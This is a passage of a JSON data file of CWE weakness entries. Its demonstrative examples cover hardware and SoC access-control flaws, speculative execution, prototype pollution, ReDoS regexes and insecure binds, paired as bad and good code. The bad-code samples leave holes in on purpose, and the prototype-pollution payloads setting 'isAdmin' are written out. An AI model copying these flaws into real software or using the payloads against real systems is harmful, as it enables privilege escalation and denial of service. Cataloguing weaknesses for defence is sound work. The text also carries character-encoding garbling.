        "demonstrative_examples": "Example 1 Consider a system with a register for storing AES key for encryption or decryption. The key is of 128 bits implemented as a set of four 32-bit registers.  The key registers are assets, and the register AES_KEY_ACCESS_POLICY is defined to provide the necessary access controls. The access-policy register defines which agents with a security identifier in the transaction can access the AES-key registers. Each bit in this 32-bit register defines a security identifier. There could be a maximum of 32 security identifiers that are allowed accesses to the AES-key registers. The number of the bit when set (i.e., \u00e2\\x80\\x9c1\u00e2\\x80\\x9d) allows for a respective action from an agent whose identity matches the number of the bit; if set to \u00e2\\x80\\x9c0\u00e2\\x80\\x9d (i.e., Clear), it disallows the respective action to that corresponding agent. (bad code) Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] forencryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_4 AES key [96:127] for encryption or decryption, Default 0x00000000 AES_KEY_ACCESS_POLICY [31:0] Default 0x00000004 \u00e2\\x80\\x93 agent with Security Identifier \u00e2\\x80\\x9c2\u00e2\\x80\\x9d has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registers The originator sends a transaction with no security identifier, i.e., meaning the value is \u00e2\\x80\\x9c0\u00e2\\x80\\x9d or NULL. The AES-Key-access register does not allow the necessary action and drops the transaction because the originator failed to include the required security identifier. (good code) Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] forencryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_4 AES key [96:127] for encryption or decryption, Default 0x00000000 AES_KEY_ACCESS_POLICY [31:0] Default 0x00000002 \u00e2\\x80\\x93 agent with security identifier \u00e2\\x80\\x9c2\u00e2\\x80\\x9d has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registers The originator should send a transaction with Security Identifier \u00e2\\x80\\x9c2\u00e2\\x80\\x9d which will allow access to the AES-Key-access register and allow encryption and decryption operations."
    },
    {
        "id": 1303,
        "demonstrative_examples": "Example 1 Secure programs perform bounds checking before accessing an array if the source of the array index is provided by an untrusted source such as user input. In the code below, data from array1 will not be accessed if x is out of bounds. However, if this code executes on a processor that performs speculative execution the outcome of the if statement could be mis-predicted and the access on the next line will occur with a value of x that can point to arbitrary locations in the program\u00e2\\x80\\x99s memory (out-of-bounds). Even though the processor rolls back the architectural effects of the mis-predicted branch, the memory accesses alter data cache state, which is not rolled back after the branch is resolved. The cache state can reveal array1[x] thereby providing a mechanism to recover any word in this program\u00e2\\x80\\x99s memory space. (bad code) if (x < array1_size)\\n    \\t\\t\\t\\t\\t\\ty = array2[array1[x] * 4096]; Code snippet is from the Spectre paper: https://spectreattack.com/spectre.pdf."
    },
    {
        "id": 1310,
        "demonstrative_examples": "Example 1 A System-on-Chip (SOC) implements a Root-of-Trust (RoT) in ROM to boot secure code. However, at times this ROM code might have security vulnerabilities and need to be patched. Since ROM is immutable, it can be impossible to patch. ROM does not have built-in application-programming interfaces (APIs) to patch if the code is vulnerable. Implement mechanisms to patch the vulnerable ROM code."
    },
    {
        "id": 1311,
        "demonstrative_examples": "Example 1 The bridge interfaces between OCP and AHB end points. OCP uses MReqInfo signal to indicate security attributes, whereas AHB uses HPROT signal to indicate the security attributes. The width of MReqInfo can be customized as needed. In this example, MReqInfo is 5-bits wide and carries the privilege level of the OCP controller. The values 5\u00e2\\x80\\x99h11, 5\u00e2\\x80\\x99h10, 5\u00e2\\x80\\x99h0F, 5\u00e2\\x80\\x99h0D, 5\u00e2\\x80\\x99h0C, 5\u00e2\\x80\\x99h0B, 5\u00e2\\x80\\x99h09, 5\u00e2\\x80\\x99h08, 5\u00e2\\x80\\x99h04, and 5\u00e2\\x80\\x99h02 in MReqInfo indicate that the request is coming from a privileged state of the OCP bus controller. Values 5\u00e2\\x80\\x99h1F, 5\u00e2\\x80\\x99h0E, and 5\u00e2\\x80\\x99h00 indicate untrusted, privilege state. Though HPROT is a 5-bit signal, we only consider the lower, two bits in this example. HPROT values 2\u00e2\\x80\\x99b00 and 2\u00e2\\x80\\x99b10 are considered trusted, and 2\u00e2\\x80\\x99b01 and 2\u00e2\\x80\\x99b11 are considered untrusted. The OCP2AHB bridge is expected to translate trusted identities on the controller side to trusted identities on the responder side.  Similarly, it is expected to translate untrusted identities on the controller side to untrusted identities on the responder side. (bad code) Example Language: Verilog module ocp2ahb ( ahb_hprot, ocp_mreqinfo ); output [1:0] ahb_hprot;        // output is 2 bit signal for AHB HPROT input [4:0] ocp_mreqinfo;      // input is 5 bit signal from OCP MReqInfo wire [6:0] p0_mreqinfo_o_temp; // OCP signal that transmits hardware identity of bus controller wire y; reg [1:0] ahb_hprot; // hardware identity of bus controller is in bits 5:1 of p0_mreqinfo_o_temp signal \"assign p0_mreqinfo_o_temp[6:0] = {1'b0, ahb_hprot[4:0], y};\" always @* begin case (p0_mreqinfo_o_temp[4:2]) \"000: ahb_hprot = 2'b11;    // OCP MReqInfo to AHB HPROT mapping\" \"001: ahb_hprot = 2'b00;\" \"010: ahb_hprot = 2'b00;\" \"011: ahb_hprot = 2'b01;\" \"100: ahb_hprot = 2'b00;\" \"101: ahb_hprot = 2'b00;\" \"110: ahb_hprot = 2'b10;\" \"111: ahb_hprot = 2'b00;\" endcase end endmodule Logic in the case statement only checks for MReqInfo bits 4:2, i.e., hardware-identity bits 3:1. When ocp_mreqinfo is 5\u00e2\\x80\\x99h1F or 5\u00e2\\x80\\x99h0E, p0_mreqinfo_o_temp[2] will be 1. As a result, untrusted IDs from OCP 5\u00e2\\x80\\x99h1F and 5\u00e2\\x80\\x99h0E get translated to trusted ahb_hprot values 2\u00e2\\x80\\x99b00."
    },
    {
        "id": 1312,
        "demonstrative_examples": "Example 1 A memory-controller IP block is connected to the on-chip fabric in a System on Chip (SoC).  The memory controller is configured to divide the memory into four parts: one original and three mirrored regions inside the memory. The upper two bits of the address indicate which region is being addressed. 00 indicates the original region and 01, 10, and 11 are used to address the mirrored regions. All four regions operate in a lock-step manner and are always synchronized. The firewall in the on-chip fabric is programmed to protect the assets in the memory. The firewall only protects the original range but not the mirrored regions. The attacker (as an unprivileged user) sends a write transaction to the mirrored region. The mirrored region has an address with the upper two bits set to \u00e2\\x80\\x9c10\u00e2\\x80\\x9d and the remaining bits of the address pointing to an asset. The firewall does not block this write transaction. Once the write is successful, contents in the protected-memory region are also updated. Thus, the attacker can bypass existing, memory protections. Firewall should protect mirrored regions."
    },
    {
        "id": 1313,
        "demonstrative_examples": ""
    },
    {
        "id": 1314,
        "demonstrative_examples": "Example 1 Malicious software executes instructions to increase power consumption to the highest possible level while causing the clock frequency to increase to its maximum value.\\n\\t\\t\\t\\t\\t\\t\\tSuch a program executing for an extended period of time would likely overheat the device, possibly resulting in permanent damage to the device. A ring, oscillator-based temperature sensor will generally report the sensed value as\\n\\t\\t\\t\\t\\t\\t\\toscillator frequency rather than degrees centigrade.  The temperature sensor will have\\n\\t\\t\\t\\t\\t\\t\\tcalibration values that are used to convert the detected frequency into the corresponding temperature in degrees centigrade. Consider a SoC design where the critical maximum temperature limit is set in fuse values to 100C and\\n\\t\\t\\t\\t\\t\\t\\tis not modifiable by software.  If the scaled thermal sensor output equals or exceeds this limit, the system is commanded to shut itself down. The thermal sensor calibration values are programmable through registers that are exposed to system software.\\n\\t\\t\\t\\t\\t\\tThese registers allow software to affect the converted temperature output such that the output will never exceed the maximum temperature limit. (bad code) Example Language: Other The sensor frequency value is scaled by applying the function: Sensed Temp = a + b * Sensor Freq where a and b are the programmable calibration data coefficients. Software sets a and b to zero ensuring the sensed\\n\\t\\t\\t\\t\\t\\t\\ttemperature is always zero. This weakness may be addressed by preventing access to a and b. (good code) Example Language: Other The sensor frequency value is scaled by applying the function: Sensed Temp = a + b * Sensor Freq where a and b are the programmable calibration data coefficients. Untrusted software is prevented from changing the values of either a or b, \\n\\t\\t\\t\\t\\t\\t\\tpreventing this method of manipulating the temperature."
    },
    {
        "id": 1315,
        "demonstrative_examples": "Example 1 A typical, phone platform consists of the main, compute core or CPU, a DRAM-memory chip, an audio codec, a baseband modem, a power-management-integrated circuit (\u00e2\\x80\\x9cPMIC\u00e2\\x80\\x9d), a connectivity (WiFi and Bluetooth) modem, and several other analog/RF components. The main CPU is the only component that can control transactions, and all the other components are responder-only devices. All the components implement a PCIe end-point to interface with the rest of the platform. The responder devices should have the bus-control-enable bit in the PCIe-end-point register set to 0 in hardware to prevent the devices from controlling transactions to the CPU or other peripherals. The audio-codec chip does not have the bus-controller-enable-register bit hardcoded to 0.  There is no platform-firmware flow to verify that the bus-controller-enable bit is set to 0 in all responders. Audio codec can now master transactions to the CPU and other platform components. Potentially, it can modify assets in other platform components to subvert system security. Platform firmware includes a flow to check the configuration of bus-controller-enable bit in all responder devices. If this register bit is set on any of the responders, platform firmware sets it to 0. Ideally, the default value of this register bit should be hardcoded to 0 in RTL. It should also have access control to prevent untrusted entities from setting this bit to become bus controllers."
    },
    {
        "id": 1316,
        "demonstrative_examples": "Example 1 An on-chip fabric supports a 64KB address space that is memory-mapped. The fabric has two range registers that support creation of two protected ranges with specific size constraints--4KB, 8KB, 16KB or 32KB. Assets that belong to user A require 4KB, and those of user B require 20KB.  Registers and other assets that are not security-sensitive require 40KB.  One range register is configured to program 4KB to protect user A\u00e2\\x80\\x99s assets. Since a 20KB range cannot be created with the given size constraints, the range register for user B\u00e2\\x80\\x99s assets is configured as 32KB. The rest of the address space is left as open. As a result, some part of untrusted and open-address space overlaps with user B range. The fabric does not support least privilege, and an attacker can send a transaction to the overlapping region to tamper with user B data. Since range B only requires 20KB but is allotted 32KB, there is 12KB of reserved space.  Overlapping this region of user B data, where there are no assets, with the untrusted space will prevent an attacker from tampering with user B data."
    },
    {
        "id": 1317,
        "demonstrative_examples": "Example 1 The iLPC2AHB bridge connects a CPU (with multiple, privilege levels, such as user, super user, debug, etc.) over AHB interface to an LPC bus. Several peripherals are connected to the LPC bus. The bridge is expected to check the privilege level of the transactions initiated in the core before forwarding them to the peripherals on the LPC bus. The bridge does not implement the checks and allows reads and writes from all privilege levels. To address this, designers should implement hardware-based checks that are either hardcoded to block untrusted agents from accessing secure peripherals or implement firmware flows that configure the bridge to block untrusted agents from making arbitrary reads or writes."
    },
    {
        "id": 1318,
        "demonstrative_examples": "Example 1 Several systems on chips (SoCs) use the Advanced-Microcontroller Bus Architecture (AMBA) Advanced-Peripheral Bus (APB) protocol.  APB is a simple, low-power bus and uses the PPROT[2:0] bits to indicate the security state of the bus masters ;PPROT[0] indicates privilege, PPROT[1] indicates secure/non-secure transaction, and PPROT[2] indicates instruction/data.  Assume that there is no fabric bridge in the SoC. One of the slaves, the power-management unit, contains registers that store the thermal-shutdown limits. The APB bus is used to connect several bus masters, each with a unique and immutable hardware identity, to several slaves. For a CPU supporting 8 potential identities (each with varying privilege levels), 16 types of outgoing transactions can be made--8 read transactions with each supported privilege level and 8 write transactions with each supported privilege level. Since APB PPROT can only support up to 8 transaction types, access-control checks cannot be performed on transactions going to the slaves at the right granularity for all possible transaction types.  Thus, potentially, user code running on the CPU could maliciously corrupt the thermal-shutdown-configuration registers to burn the device, resulting in permanent denial of service. In this scenario, only peripherals that need access protection from 8 of the 16 possible transaction types can be connected to the APB bus. Peripherals that require protection from the remaining 8 transaction types can be connected to a different APB bus. Alternatively, a bridge could be implemented to handle such complex scenarios before forwarding traffic to the APB bus. Example 2 The Open-Core-Protocol (OCP) fabric supports two configurable, width-optional signals for transporting security attributes: MReqInfo and SRespInfo.  MReqInfo is used to transport security attributes from bus master to slave, and SRespInfo is used to transport security attributes from slave to bus master. An SoC uses OCP to connect several bus masters, each with a unique and immutable hardware identity, to several slaves.  One of the bus masters, the CPU, reports the privilege level (user or super user) in addition to the unique identity.  One of the slaves, the power-management unit, contains registers that store the thermal-shutdown limits. Since MReqInfo and SRespInfo are not mandatory, these signals are not configured when autogenerating RTL for the OCP fabric.  Thus, the fabric cannot be used to transport security attributes from bus masters to slave. Code running at user-privilege level on the CPU could maliciously corrupt the thermal-shutdown-configuration registers to burn the device and cause permanent denial of service. To address this, configure the fabric to include MReqInfo and SRespInfo signals and use these to transport security identity and privilege level to perform access-control checks at the slave interface."
    },
    {
        "id": 1319,
        "demonstrative_examples": "Example 1 In many devices, security related information is stored in fuses. These fuses are loaded into shadow registers at boot time. Disturbing this transfer phase with EM-FI can lead to the shadow registers storing erroneous values potentially resulting in reduced security. \"Colin O'Flynn has demonstrated an attack scenario which uses electro-magnetic glitching during booting to bypass security and gain read access to flash, read and erase access to shadow memory area (where the private password is stored). Most devices in the MPC55xx and MPC56xx series that include the Boot Assist Module (BAM) (a serial or CAN bootloader mode) are susceptible to this attack. In this paper, a GM ECU was used as a real life target. While the success rate appears low (less than 2 percent), in practice a success can be found within 1-5 minutes once the EMFI tool is setup. In a practical scenario, the author showed that success can be achieved within 30-60 minutes from a cold start.\""
    },
    {
        "id": 1320,
        "demonstrative_examples": "Example 1 Consider a platform design where a Digital-Thermal Sensor (DTS) is used to monitor temperature and compare that output against a threshold value.\\n\\t\\t\\t\\t\\t\\t\\tIf the temperature output equals or exceeds the threshold value, the DTS unit sends an alert signal to the processor. The processor, upon getting the alert, input triggers system shutdown. The alert signal is handled as a General-Purpose-I/O (GPIO) pin in input mode. (bad code) The processor-GPIO controller exposes software-programmable controls that allow untrusted software to reprogram the state of the GPIO pin. Reprogramming the state of the GPIO pin allows malicious software to trigger spurious alerts or to set the alert pin to a zero value so that thermal sensor alerts are not received by the processor. (good code) The GPIO alert-signal pin is blocked from untrusted software access and is controlled only by trusted software, such as the System BIOS."
    },
    {
        "id": 1321,
        "demonstrative_examples": "Example 1 This function sets object attributes based on a dot-separated path. (bad code) Example Language: JavaScript function setValueByPath (object, path, value) { const pathArray = path.split(\".\"); const attributeToSet = pathArray.pop(); let objectToModify = object; for (const attr of pathArray) { \"if (typeof objectToModify[attr] !== 'object') {\" objectToModify[attr] = {}; } objectToModify = objectToModify[attr]; } objectToModify[attributeToSet] = value; return object; } This function does not check if the attribute resolves to the object prototype. These codes can be used to add \"isAdmin: true\" to the object prototype. (bad code) Example Language: JavaScript setValueByPath({}, \"__proto__.isAdmin\", true) setValueByPath({}, \"constructor.prototype.isAdmin\", true) By using a denylist of dangerous attributes, this weakness can be eliminated. (good code) Example Language: JavaScript function setValueByPath (object, path, value) { const pathArray = path.split(\".\"); const attributeToSet = pathArray.pop(); let objectToModify = object; for (const attr of pathArray) { // Ignore attributes which resolve to object prototype if (attr === \"__proto__\" || attr === \"constructor\" || attr === \"prototype\") { continue; } if (typeof objectToModify[attr] !== \"object\") { objectToModify[attr] = {}; } objectToModify = objectToModify[attr]; } objectToModify[attributeToSet] = value; return object; }"
    },
    {
        "id": 1322,
        "demonstrative_examples": ""
    },
    {
        "id": 1323,
        "demonstrative_examples": "Example 1 In a SoC, traces generated from sources\\n                        include security-sensitive IP blocks such as CPU (with\\n                        tracing information such as instructions executed and\\n                        memory operands), on-chip fabric (e.g., memory-transfer\\n                        signals, transaction type and destination, and\\n                        on-chip-firewall-error signals), power-management\\n                        IP blocks (e.g., clock- and power-gating signals), and\\n                        cryptographic coprocessors (e.g., cryptographic keys and\\n                        intermediate values of crypto operations), among\\n                        other non-security-sensitive IP blocks including timers\\n                        and other functional blocks. The collected traces are\\n                        then forwarded to the debug and trace interface used by\\n                        the external hardware debugger. (bad code) Example Language: Other The traces do\\n                        not have any privilege level attached to them. All\\n                        collected traces can be viewed by any debugger (i.e., SoC\\n                        designer, OEM debugger, or end user). (good code) Example Language: Other Some of the\\n                        traces are SoC-design-house secrets, while some are OEM\\n                        secrets. Few are end-user secrets and the rest are\\n                        not security-sensitive. Tag all traces with the\\n                        appropriate, privilege level at the source. The bits\\n                        indicating the privilege level must be immutable in\\n                        their transit from trace source to the final, trace\\n                        sink. Debugger privilege level must be checked before\\n                        providing access to traces."
    },
    {
        "id": 1324,
        "demonstrative_examples": "Example 1 A TAP accessible register is read/written by a JTAG\\n                        based tool, for internal tool use for an authorized\\n                        user.  The JTAG based tool does not provide access to\\n                        this data to an unauthorized user of the tool.\\n                        However, the user can connect a probing device and\\n                        collect the values directly from the JTAG interface, if\\n                        no additional protections are employed."
    },
    {
        "id": 1325,
        "demonstrative_examples": "Example 1 This example contains a small allocation of stack memory. When the program was first constructed, the number of times this memory was allocated was probably inconsequential and presented no problem. Over time, as the number of objects in the database grow, the number of allocations will grow - eventually consuming the available stack, i.e. \"stack exhaustion.\" An attacker who is able to add elements to the database could cause stack exhaustion more rapidly than assumed by the developer. (bad code) Example Language: C // Gets the size from the number of objects in a database, which over time can conceivably get very large int end_limit = get_nmbr_obj_from_db(); int i; int *base = NULL; int *p =base; for (i = 0; i < end_limit; i++) { *p = alloca(sizeof(int *)); // Allocate memory on the stack p = *p; // // Point to the next location to be saved } Since this uses alloca(), it allocates memory directly on the stack.  If end_limit is large enough, then the stack can be entirely consumed."
    },
    {
        "id": 1326,
        "demonstrative_examples": "Example 1 The RoT is stored in memory. This memory can be modified by an adversary. For example, if an SoC implements \u00e2\\x80\\x9cSecure Boot\u00e2\\x80\\x9d by storing the boot code in an off-chip/on-chip flash, the contents of the flash can be modified by using a flash programmer. Similarly, if the boot code is stored in ROM (Read-Only Memory) but the public key or the hash of the public key (used to enable \u00e2\\x80\\x9cSecure Boot\u00e2\\x80\\x9d) is stored in Flash or a memory that is susceptible to modifications or writes, the implementation is vulnerable. In general, if the boot code, key materials and data that enable \u00e2\\x80\\x9cSecure Boot\u00e2\\x80\\x9d are all mutable, the implmentation is vulnerable. Good architecture defines RoT as immutable in hardware. One of the best ways to achieve immutability is to store boot code, public key or hash of the public key and other relevant data in Read-Only Memory (ROM) or One-Time Programmable (OTP) memory that prevents further programming or writes."
    },
    {
        "id": 1327,
        "demonstrative_examples": "Example 1 The following code snippet uses 0.0.0.0 in a Puppet script. (bad code) Example Language: Other signingserver::instance { \"nightly-key-signing-server\": listenaddr     => \"0.0.0.0\", port           => \"9100\", code_tag       => \"SIGNING_SERVER\", } The Puppet code snippet is used to provision a signing server that will use 0.0.0.0 to accept traffic. However, as 0.0.0.0 is unrestricted, malicious users may use this IP address to launch frequent requests and cause denial of service attacks. (good code) Example Language: Other signingserver::instance { \"nightly-key-signing-server\": listenaddr     => \"127.0.0.1\", port           => \"9100\", code_tag       => \"SIGNING_SERVER\", }"
    },
    {
        "id": 1328,
        "demonstrative_examples": "Example 1 A new version of firmware is signed with a security version number higher than the previous version. During the firmware update process the SoC checks for the security version number and upgrades the SoC firmware with the latest version. This security version number is stored in persistent memory upon successful upgrade for use across power-on resets. In general, if the security version number is mutable, the implmentation is vulnerable. A mutable security version number allows an adversary to change the security version to a lower value to allow roll-back or to a higher value to prevent future upgrades. The security version number should be stored in immutable hardware such as fuses, and the writes to these fuses should be highly access-controlled with appropriate authentication and authorization protections."
    },
    {
        "id": 1329,
        "demonstrative_examples": ""
    },
    {
        "id": 1330,
        "demonstrative_examples": "Example 1 Consider a device that uses flash memory for non-volatile-data storage. To optimize flash-access performance or reliable-flash lifetime, the device might limit the number of flash writes/erases by maintaining some state in internal SRAM and only committing changes to flash memory periodically. The device also supports user reset to factory defaults with the expectation that all personal information is erased from the device after this operation. On factory reset, user files are erased using explicit, erase commands supported by the flash device. In the given, system design, the flash-file system can support performance-optimized erase such that only the file metadata are erased and not the content. If this optimized erase is used for files containing user data during factory-reset flow, then device, flash memory can contain remanent data from these files. On device-factory reset, the implementation might not erase these copies, since the file organization has changed and the flash file system does not have the metadata to track all previous copies. A flash-memory region that is used by a flash-file system should be fully erased as part of the factory-reset flow. This should include secure-erase flow for the flash media such as overwriting patterns multiple times followed by erase."
    },
    {
        "id": 1331,
        "demonstrative_examples": "Example 1 Consider a NoC that implements a one-dimensional, mesh network with four nodes. This supports two flows: Flow A from node 0 to node 3 (via node 1 and node 2) and Flow B from node 1 to node 2. Flows A and B share a common link between Node 1 and Node 2.  Only one flow can use the link in each cycle. One of the masters to this NoC implements a crypto algorithm (RSA), and another master to the NoC is a core that can be exercised by an attacker. The RSA algorithm performs a modulo multiplication of two, large numbers and depends on each bit of the secret key. The algorithm examines each bit in the secret key and only performs multiplication if the bit is 1. This algorithm is known to be prone to timing attacks. Whenever RSA performs multiplication, there is additional, network traffic to the memory controller. One of the reasons for this is cache conflicts. Since this is a one-dimensional mesh, only one flow can use the link in each cycle.  Also, packets from the attack program and the RSA program share the output port of the network-on-chip.  This contention results in network interference, and the throughput and latency of one flow can be affected by the other flow\u00e2\\x80\\x99s demand. The attacker runs a loop program on the core they control, and this causes a cache miss in every iteration for the RSA algorithm. Thus, by observing network-traffic bandwidth and timing, the attack program can determine when the RSA algorithm is doing a multiply operation (i.e., when secret key bit is 1) and eventually extract the entire, secret key. Implement priority-based arbitration inside the NoC and have dedicated buffers or virtual channels for routing secret data from trusted agents."
    },
    {
        "id": 1333,
        "demonstrative_examples": "Example 1 This example attempts to check if an input string is a \"sentence\" [ REF-1164 ]. (bad code) Example Language: JavaScript var test_string = \"Bad characters: $@#\"; var bad_pattern  = /^(\\\\w+\\\\s?)*$/i; var result = test_string.search(bad_pattern); The regular expression has a vulnerable backtracking clause inside (\\\\w+\\\\s?)*$ which can be triggered to cause a Denial of Service by processing particular phrases. To fix the backtracking problem, backtracking is removed with the ?= portion of the expression which changes it to a lookahead and the \\\\2 which prevents the backtracking. The modified example is: (good code) Example Language: JavaScript var test_string = \"Bad characters: $@#\"; var good_pattern  = /^((?=(\\\\w+))\\\\2\\\\s?)*$/i; var result = test_string.search(good_pattern); Note that [ REF-1164 ] has a more thorough (and lengthy) explanation of everything going on within the RegEx. Example 2 This example attempts to check if an input string is a \"sentence\" and is modified for Perl [ REF-1164 ]. (bad code) Example Language: Perl my $test_string = \"Bad characters: \\\\$\\\\@\\\\#\"; my $bdrslt = $test_string; $bdrslt =~ /^(\\\\w+\\\\s?)*$/i; The regular expression has a vulnerable backtracking clause inside (\\\\w+\\\\s?)*$ which can be triggered to cause a Denial of Service by processing particular phrases. To fix the backtracking problem, backtracking is removed with the ?= portion of the expression which changes it to a lookahead and the \\\\2 which prevents the backtracking. The modified example is: (good code) Example Language: Perl my $test_string = \"Bad characters: \\\\$\\\\@\\\\#\"; my $gdrslt = $test_string; $gdrslt =~ /^((?=(\\\\w+))\\\\2\\\\s?)*$/i; Note that [ REF-1164 ] has a more thorough (and lengthy) explanation of everything going on within the RegEx."
    },
    {
        "id": 1334,
        "demonstrative_examples": ""
    }
]